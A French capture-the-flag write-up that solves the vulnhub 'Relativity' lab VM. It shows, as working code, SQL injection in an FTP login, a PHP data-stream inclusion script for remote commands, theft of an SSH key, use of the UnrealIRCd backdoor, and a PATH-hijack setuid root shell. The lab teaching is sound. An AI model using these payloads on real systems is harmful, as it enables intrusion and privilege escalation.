# Solution du CTF Relativity

Introduction
------------

Le site Internet [vulnhub.com](http://vulnhub.com/) propose différentes images virtuelles pour des logiciels de virtualisation.  

L'objectif : se faire la main en sécurité informatique en testant ses compétences et ses outils en toute légalité.  

Certaines des VMs proposées sont plombées de toute part et permettent par exemple de s'amuser avec *SQLMap*.  

Pour d'autres, aucune information n'est donnée quand aux vulnérabilités présentes. Le seul objectif consiste à capturer le drapeau et c'est à vous de trouver le cheminement pour y accèder. Ces challenges sont généralement intéressants et relativement proche de ce que l'on peut trouver dans la réalité, raison de plus pour s'y adonner.  

Dans le présent article je vous présente une solution possible du CTF baptisé *"Relativity"* dont l'objectif est d'obtenir le drapeau qui est le contenu du fichier */root/flag.txt* accessible bien entendu seulement avec les privilèges du super-utilisateur.  

J'ai utilisé au maximum des logiciels libres, open-source et gratuits qui sont donc accessibles à tous.  

Mise en place de la machine virtuelle
-------------------------------------

Une fois téléchargé et décompressé [l'archive du challenge](http://vulnhub.com/entry/devrandom_relativity,55/) on se rend compte qu'elle est destinée à *VMWare Player*.  

Qu'importe il est possible de la charger dans *VirtualBox*. La conversion est en réalité transparente.  

Une fois *VirtualBox* lancé, cliquez sur le bouton *"Nouvelle"* puis renseignez les informations comme suit :  

![Création image VirtualBox](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity1.png)

Ces paramètres ne sont pas fantaisistes : ils sont en réalité trouvables dans le fichier *.vmx* qui a été extrait.  

Il s'agit d'un fichier de configuration au format texte dans lequel on retrouve la ligne suivante :  

> guestOS = "fedora-64"

Par conséquent ceux qui disposent d'un système 32 bits ne devraient malheureusement pas être en mesure de faire tourner la VM (tournez-vous vers un autre challenge ! ;-) )  

Choisissez ensuite la quantité de mémoire que vous souhaitez affecter à votre machine virtuelle. Si cela ne pose pas de problèmes, laissez la valeur proposée par défaut.  

L'étape suivante est la plus importante puisque l'on va charger le disque vmdk du challenge. Parmi les choix proposés choisissez *"Utiliser un fichier de disque dur virtuel existant"* et sélectionnez le fichier *relativity.vmdk* puis cliquez sur *"Créer"*.  

La VM est prête à être lancée mais auparavant je vous conseille de désactiver les options qui ne vous intéressent pas dans le cadre du challenge (comme le son, l'accès aux périphériques USB..) pour gagner un peu de ressources.  

Enfin vous devez aussi fixer dans les paramètres réseau de la VM le *"mode d'accès réseau"* à *"Accès par pont"* de cette manière vous pourrez communiquer avec le système virtualisé comme s'il s'agissait d'une autre machine présente sur votre réseau local. Notez au passage l'adresse MAC qui nous servira par la suite. Validez et démarrez la VM.  

Un tour du propriétaire
------------------------

Bien ! Scannons les ports de la machine... Mais c'est quoi son IP au juste ?  

Malheureusement si les *Guest Additions* de *VirtualBox* n'ont pas été installées sur la VM il n'y a pas de moyen vraiment facile de l'obtenir.  

Vous pouvez soit faire un *"arp -a"* et retrouver l'adresse MAC dans la liste ou procéder par élimination si l'adresse MAC n’apparaît pas.  

Vous pouvez aussi lancer un PING scan avec *NMap* qui nous donnera l'adresse IP et l'adresse MAC de chaque machine présente sur le réseau :

```plain
nmap -sn 192.168.1.0/24
```

parmi les lignes obtenues je retrouve l'adresse MAC de la VM :

```plain
Nmap scan report for 192.168.1.57
Host is up (0.00016s latency).
MAC Address: 08:00:27:D5:72:05 (Cadmus Computer Systems)
```

Maintenant on peut lancer un scan de port de notre future victime (référez-vous au manuel de *NMap* pour la signification des options) :)

```plain
nmap -A 192.168.1.57

Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-03 19:07 CET
Nmap scan report for 192.168.1.57
Host is up (0.00053s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp
|_ftp-bounce: no banner
22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
| ssh-hostkey: 1024 42:d0:50:45:6c:4f:6a:25:d9:5e:d4:7d:12:26:04:ef (DSA)
|_2048 1b:e9:72:2b:8a:0b:57:0a:4b:ad:3d:06:62:94:29:02 (RSA)
80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
|_http-title: M.C. Escher - Relativity
1 service unrecognized despite returning data. If you know the service/version, please submit
the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port21-TCP:V=6.40%I=7%D=3/3%Time=5314C4DB%P=x86_64-suse-linux-gnu%r(Gen
SF:ericLines,29,"220\x20Welcome\x20to\x20Relativity\x20FTP\x20\(mod_sql\)\
SF:r\n");
MAC Address: 08:00:27:D5:72:05 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.9
Network Distance: 1 hop
Service Info: Host: Relativity

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.1.57

OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.71 seconds
```

Get a shell or die tryin
------------------------

Il y a donc 3 services qui tournent : un serveur web Apache 2.2.23, un serveur OpenSSH 5.9 ainsi qu'un serveur FTP qui semble inconnu mais dont la bannière est prometeuse (on peut lire mod\_sql).  

Après un tour rapide sur le serveur web (rien d'intéressant de trouvé), on décide de s'attaquer au serveur FTP.  

Qui dit SQL (comme dans mod\_sql) dit potentiellement injection SQL. On joue alors un peu avec le client FTP et le nom d'utilisateur et on s'apperçoit vite qu'il a du mal à digérer la présence de l'apostrophe dans le username :)  

![Test injection SQL](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity2.png)

Maintenant essayons de faire des injections qui ne font pas crasher la connexion et qui pourraient nous en apprendre plus.  

Si on tente de fermer la requête SQL sous-jacente en saisissant le login root';# on obtient tout de même une fermeture prématurée de la connexion.  

En revanche si on ne ferme pas la connexion mais qu'on l'agrémente d'une condition supplémentaire avec le nom d'utilisateur suivant :

```plain
root'/**/or/**/'1'='1
```

on voit alors que tout se passe normalement (message indiquant que le password est invalide mais la connexion reste ouverte).  

En remplaçant le '1' par un mot clé MySQL comme USER() ou VERSION() pas plus de crash ce qui confirme que l'on a bien affaire à une base MySQL.  

Si on indique la colonne 'passwd' pas de fermeture non plus. On pourrait donc assez facilement brute-forcer le nom des colonnes.
Il est aussi possible de provoquer des timeouts en injectant un sleep() avec le nom d'utilisateur suivant :

```plain
root'/**/or/**/sleep(15)='1
```

Par conséquent il doit être possible d'utiliser la fonction IF() de MySQL à notre avantage.  

Mais d'abord déterminons pourquoi nous ne pouvons pas simplement faire fermer la requête SQL. Vraisemblablement le code généré en fond s'attend à trouver un autre caractère. Que se passe-t-il si nous fermons aussi une parenthèse ?  

![Injection SQL, pas de crash](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity3.png)

Bingo ! *Login failed*, pas de déconnexion.  

Maintenant essayons de voir ce que l'on peut faire à l'aide d'une clause UNION.  

Si plusieurs enregistrements remontent, la ligne de notre union peut potentiellement prendre le dessus et on pourrait en quelque sorte tricher sur le contenu de la base.  

Il nous faut d'abord déterminer le nombre de colonnes remontées par la requête, pour cela on va faire un script Python qui teste une puis deux, puis trois et ainsi de suite, colonnes :  

```python
from ftplib import FTP
import sys

for i in range(1,10):
    login = "root')/**/union/**/select/**/" + ','.join(["1" for __ in range(i)]) + "/**/from/**/information_schema.tables;#"
    password = '1'

    ftp = FTP('192.168.1.57')
    try:
        ftp.login(login, password)
    except EOFError:
        print "Failed union with {0} columns".format(i)
        continue
    else:
        print "directory:", ftp.pwd()
        print "No crash with username '{0}'".format(login)
        ftp.quit()
        break
print "done"
```

Résultat obtenu :

```plain
Failed union with 1 columns
Failed union with 2 columns
Failed union with 3 columns
Failed union with 4 columns
Failed union with 5 columns
directory: /
No crash with username 'root')/**/union/**/select/**/1,1,1,1,1,1/**/from/**/information_schema.tables;#'
done
```

Le script est allé bien au delà de nos espérances puisqu'il a réussi à se connecter :)  

On relance le client FTP et on utilise notre nom d'utilisateur très spécial.  

![Connexion au serveur FTP](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity4.png)

Notre exploit a visiblement mis le serveur FTP dans un état un peu particulier car contrairement aux droits affichés on ne peut pas faire un *"cd"* dans le dossier *0f756638e0737f4a0de1c53bf8937a08*. Ce qui n'est pas trop génant puisqu'on peut lister son contenu.  

Hop ! Direction http://192.168.1.57/0f756638e0737f4a0de1c53bf8937a08/ voir si on trouve finalement quelque chose d'intéressant.  

En regardant comment sont formées les URLs il semble évident qu'on est en présence d'une faille de type local file disclosure ou include().  

![Pages web cachées](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity5.png)

On teste rapidement quelques entrées pour le paramètre page comme /etc/passwd, ../../../../../../etc/passwd, .htaccess, /proc/self/environ mais de toute évidence il y a une protection supplémentaire.  

Idem en testant une injection via *php://input* (petit script qui pourrait vous servir) :

```python
import requests

cmd = "<?php echo('y0');?>"
url = "http://192.168.1.57/0f756638e0737f4a0de1c53bf8937a08/index.php?page=php://input"
r = requests.post(url, data=cmd)
print r.content
```

Finalement on obtient un résultat avec l'utilisation d'un [flux data](https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/).  

La fonction *system()* semble avoir été bloquée mais *passthru()* fonctionne à merveille :) On se fait un petit outil qui nous permet de passer des commandes presque comme si on y était :

```python
import requests
import base64
import sys

if len(sys.argv) < 2:
    print "Usage: python sploit.py cmd arg1 arg2..."()

cmd = ' '.join(sys.argv[1:])

cmd = base64.b64encode("<?php passthru('{0}');?>".format(cmd))
url = "http://192.168.1.57/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data:;base64," + cmd
r = requests.get(url)
start = r.content.index('div id="content"') + 17
try:
    end = r.content.index('</div>', start)
    print r.content[start:end]
except:
    print r.content
```

On s’aperçoit assez vite que *wget* n'est pas installé et que *curl* a été retiré (*locate* indique son emplacement mais le binaire ne semble plus y être).  

Via un *ls -alR /home* on découvre deux utilisateur : *jetta* et *mauk*.
Le second a été quelque peu permissif sur les droits d'accès de ses fichiers puisqu'il est possible de lire ses clés SSH !

```plain
/home:
total 16
drwxr-xr-x.  4 root  root  4096 Feb 25  2013 .
dr-xr-xr-x. 18 root  root  4096 Feb 28  2013 ..
drwx------.  3 jetta jetta 4096 Jul  9  2013 jetta
drwxr-xr-x.  3 mauk  mauk  4096 Jul  9  2013 mauk

/home/mauk:
total 28
drwxr-xr-x. 3 mauk mauk 4096 Jul  9  2013 .
drwxr-xr-x. 4 root root 4096 Feb 25  2013 ..
-rw-------. 1 mauk mauk   70 Jul  9  2013 .bash_history
-rw-r--r--. 1 mauk mauk   18 Apr 23  2012 .bash_logout
-rw-r--r--. 1 mauk mauk  193 Apr 23  2012 .bash_profile
-rw-r--r--. 1 mauk mauk  124 Apr 23  2012 .bashrc
drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .ssh

/home/mauk/.ssh:
total 20
drwxr-xr-x. 2 mauk mauk 4096 Jul  9  2013 .
drwxr-xr-x. 3 mauk mauk 4096 Jul  9  2013 ..
-rw-r--r--. 1 mauk mauk  397 Feb 24  2013 authorized_keys
-rw-r--r--. 1 mauk mauk 1679 Feb 24  2013 id_rsa
-rw-r--r--. 1 mauk mauk  397 Feb 24  2013 id_rsa.pub
```

On affiche le contenu de *id\_rsa* que l'on écrit dans un fichier *mauk\_key* en local puis on se connecte via SSH sur notre cible :

```plain
ssh -i mauk_key mauk@192.168.1.57
```

(on aura préalablement mis les bonnes permissions sur le fichier *mauk\_key* pour que SSH ne râle pas)  

![Connexion avec le compte mauk](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity6.png)

Ca y est on est dans la boîte !

Tant qu'il y a du shell, il y a de l'espoir
-------------------------------------------

Bien, on a maintenant un shell sexy grace à SSH mais on est pas encore parvenu à la capture du drapeau.  

Quelle est la suite des opérations ? Quand on fait un ps aux on remarque un exécutable lancé avec les droits de l'utilisateur *jetta* : */opt/Unreal/src/ircd*  

On a aucun droit sur le dossier */opt/Unreal*. Toutefois avec netstat on remarque que le serveur IRC tourne sur un port standard (6667). Au passage on retrouve le mysqld (3306) ainsi qu'un sendmail (25). Tous écoutent sur le loopback c'est pourquoi on ne les a pas découvert lors du scan.  

Pour rendre le serveur IRC accessible depuis l'extérieur, on va mettre en place un relais. Comme *socat* n'est pas présent sur la machine, je vais rapatrier *KevProxy* (voir mon article [sur le bypass de firewall](http://devloop.users.sourceforge.net/index.php?article27/bypass-de-firewall-sur-le-port-source))  
.

D'abord en local je lance [un serveur HTTP minimaliste python-powered](http://docs.python.org/2/library/simplehttpserver.html) en étant dans le même dossier que *KevProxy.c* :

```plain
python -m SimpleHTTPServer 8000
```

Puis sur mon accès VM :

* je lance un petit one-liner Python pour remplacer le wget
* je compile KevProxy
* je le lance pour créer mon tunnel vers le serveur IRC

![Redirection de port avec KevProxy](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity7.png)

Plus qu'à configurer *Konversation* pour se connecter au serveur *UnrealIRC* :  

![Connexion au serveur UnrealIRCd](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity8.png)

On remarque que le serveur est en version 3.2.8.1. Il s'agit ni plus ni moins [d'une version qui a été backdoorée](http://d4n3ws.polux-hosting.com/2010/06/13/unrealircd-backdoore/) et dont on trouve différents exploits [sur *SecurityFocus*](http://www.securityfocus.com/bid/40820/exploit).  

Mon dévolu s'est porté sur l'exploit en version Python. Le principe de la backdoor consiste à envoyer une commande de la sorte au serveur :  

```plain
AB;ls;
```

Ainsi la commande *ls* sera exécutée. Il faut modifier quelque peu l'exploit car le serveur affiche deux messages avant de bien vouloir recevoir les commandes (on placera deux recv) et il faut aussi prendre en compte le fait que l'output n'est pas directement retourné (on lance les commandes en aveugle).  

On va utiliser le fait qu'on dispose déjà d'une clé SSH connue sur le système pour nous ouvrir les portes de l'utilisateur *jetta* :

```plain
python 40820.py 192.168.1.57 9999 "mkdir -p /home/jetta/.ssh"
python 40820.py 192.168.1.57 9999 "cat /home/mauk/.ssh/id_rsa.pub >> /home/jetta/.ssh/authorized_keys"
```

puis on se connecte :

```plain
ssh -i mauk_key jetta@192.168.1.57
```

Capture the flag
----------------

On remarque que dans son *home* l'utilisateur dispose d'un dossier *auth\_server* appartenant à root.  

Dans ce dossier on trouve un autre binaire du même nom. Le programme n'est pas setuid root mais quand on appelle *sudo -l* on obtient :

```plain
User jetta may run the following commands on this host:
    (root) NOPASSWD: /home/jetta/auth_server/auth_server
```

Donc si on fait *sudo auth\_server* le programme sera lancé comme si on était root. Par curiosité on lance un *strings* dessus et on remarque dans la vingtaine de lignes :

```plain
could not establish connection
invalid certificates
error: (12)
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$"
```

Monumentale erreur ! Appeler un programme sans spécifier son path exact !  

Comment le programme réagit-il quand on le lance normalement ?  

![Fonctionnement de auth_server](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity9.png)

Modifions quelque peu les choses. D'abord écrivons un programme *fortune.c* comme suit dont le rôle est de passer un binaire à nous baptisé *gotroot* en setuid root :

```c
#include <unistd.h>
#include <stdio.h>

int main(void)
{
  chown("/home/jetta/gotroot", 0, 0);
  chmod("/home/jetta/gotroot", 04777);
  printf("Done");
  return 0;
}
```

puis le programme *gotroot.c* qui nous donnera un shell avec les privilèges du super utilisation :

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```

On compile les deux, on modifie le path (*export PATH=.:$PATH*, on le voit pas dans la capture) et on profite :  

![Exploitation de auth_server](https://raw.githubusercontent.com/devl00p/blog/master/images/relativity10.png)

Ca y est, mission accomplished 8-)  

NB: Sur *vulnhub* vous trouverez d'autres solutions pour ce CTF. Certains participants sont passés par des techniques différentes et ont utilisé d'autres outils. Il peut être intéressant d'avoir les différentes solutions possibles.  

En l’occurrence le serveur FTP est juste un *ProFTP* avec une bannière personnalisée mais ma version de *Nmap* n'a pas su le détecter. C'est dommage car un exploit relatif à son utilisation avec *mod\_sql* est trouvable sur la toile.

*Published March 04 2014 at 18:45*